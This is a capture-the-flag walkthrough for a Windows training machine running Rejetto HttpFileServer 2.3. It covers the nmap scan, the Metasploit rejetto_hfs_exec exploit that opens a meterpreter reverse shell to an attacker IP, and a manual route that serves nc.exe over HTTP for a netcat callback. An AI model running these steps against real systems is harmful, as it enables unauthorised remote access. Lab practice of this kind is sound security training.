***

Author: dxWiz  
Date: 24 Mar 2022

***

# Task 1 Introduction 

Pretty straight forward, start the machine and go to the machine url and look for your answer in the source code to find out who is the employee of the month.

# Task 2 Initial Access  

Do an nmap scan `nmap -sC -sV $IP` and the scan result will lead you to the answer for question 1. 

    PORT      STATE SERVICE            VERSION
    80/tcp    open  http               Microsoft IIS httpd 8.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-title: Site doesn't have a title (text/html).
    |_http-server-header: Microsoft-IIS/8.5
    135/tcp   open  msrpc              Microsoft Windows RPC
    139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    3389/tcp  open  ssl/ms-wbt-server?
    | rdp-ntlm-info: 
    |   Target_Name: STEELMOUNTAIN
    |   NetBIOS_Domain_Name: STEELMOUNTAIN
    |   NetBIOS_Computer_Name: STEELMOUNTAIN
    |   DNS_Domain_Name: steelmountain
    |   DNS_Computer_Name: steelmountain
    |   Product_Version: 6.3.9600
    |_  System_Time: 2022-03-22T11:49:13+00:00
    | ssl-cert: Subject: commonName=steelmountain
    | Not valid before: 2022-03-21T11:45:50
    |_Not valid after:  2022-09-20T11:45:50
    |_ssl-date: 2022-03-22T11:49:19+00:00; +2s from scanner time.
    8080/tcp  open  http               HttpFileServer httpd 2.3  
    |_http-server-header: HFS 2.3
    |_http-title: HFS /
    49152/tcp open  msrpc              Microsoft Windows RPC
    49153/tcp open  msrpc              Microsoft Windows RPC
    49154/tcp open  msrpc              Microsoft Windows RPC
    49155/tcp open  msrpc              Microsoft Windows RPC
    49156/tcp open  msrpc              Microsoft Windows RPC
    49163/tcp open  msrpc              Microsoft Windows RPC
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

To find the name of the file server, just go to $IP:8080 and take note of the create url of the file server.

Run `searchsploit rejetto http file server 2.3 -w` to find the answer for the CVE number.

Start metasploit with the command `msfconsole` and `search http file server 2.3`

    0  auxiliary/server/android_mercury_parseuri                                normal     No     Android Mercury Browser Intent URI Scheme and Directory Traversal Vulnerability
    1  exploit/linux/smtp/apache_james_exec                    2015-10-01       normal     Yes    Apache James Server 2.3.2 Insecure User Creation Arbitrary File Write
    2  exploit/multi/http/git_client_command_exec              2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
    3  exploit/windows/http/rejetto_hfs_exec                   2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
    4  exploit/windows/scada/codesys_gateway_server_traversal  2013-02-02       excellent  No     SCADA 3S CoDeSys Gateway Server Directory Traversal
    
`use 3` and then `show options` to see what are the required parameters to set. We begin by `set RHOSTS $IP` and `set RPORT 8080`. Also `set LHOST` to attacker machine IP. Final setting will be like below:

    msf6 exploit(windows/http/rejetto_hfs_exec) > show options

    Module options (exploit/windows/http/rejetto_hfs_exec):

     Name       Current Setting  Required  Description
     ----       ---------------  --------  -----------
     HTTPDELAY  10               no        Seconds to wait before terminating web server
     Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
     RHOSTS     <Target>$IP      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
     RPORT      8080             yes       The target port (TCP)
     SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine
                                            or 0.0.0.0 to listen on all addresses.
     SRVPORT    8080             yes       The local port to listen on.
     SSL        false            no        Negotiate SSL/TLS for outgoing connections
     SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
     TARGETURI  /                yes       The path of the web application
     URIPATH                     no        The URI to use for this exploit (default is random)
     VHOST                       no        HTTP server virtual host


    Payload options (windows/meterpreter/reverse_tcp):

     Name      Current Setting  Required  Description
     ----      ---------------  --------  -----------
     EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
     LHOST     <Attacker>$IP     yes       The listen address (an interface may be specified)
     LPORT     4444             yes       The listen port


To run the exploit, just type `run` or `exploit` and wait patiently until you see below 

    msf6 exploit(windows/http/rejetto_hfs_exec) > run

    [*] Started reverse TCP handler on 10.11.56.137:4444 
    [*] Using URL: http://0.0.0.0:8080/hofayz
    [*] Local IP: http://10.0.2.15:8080/hofayz
    [*] Server started.
    [*] Sending a malicious request to /
    [*] Payload request received: /hofayz
    [*] Sending stage (175174 bytes) to 10.10.40.39


    [*] Meterpreter session 5 opened (<Attacker>$IP:4444 -> <Target>$IP:49298 ) at 2022-03-24 12:02:09 -0400
    [*] Server stopped.
    [!] This exploit may require manual cleanup of '%TEMP%\KxkkPLaE.vbs' on the target

    meterpreter > 

Go to C:\users\bill\desktop and `type user.txt` to get the flag for the last question

# Task 3 Privilege Escalation 

Just follow the instrcution and use metasploit to continue with the studies.

# Task 4 Access and Escalation Without Metasploit (python3 friendly)

For this task, in the latest release of python, urllib2 is gone and hence we need to use a tool name 2to3 to convert the exploit script 39161.py to a python3 friend 39161.py with the following command

`2to3 39161.py -w` this will create a backup of the original script and rewrite the script to python version3. If you do not have 2to3 in your machine, just install it `sudo apt install 2to3`

By now you should be ready with the new script. Go to the folder which stored `nc.exe` and start a simple HTTP server `python3 -m http.server 80` (take note the default port is 8000 if unspecified) and listen to a port of your choice with `nc` and then try running the script twice as instructed. You should be able to get a callback.
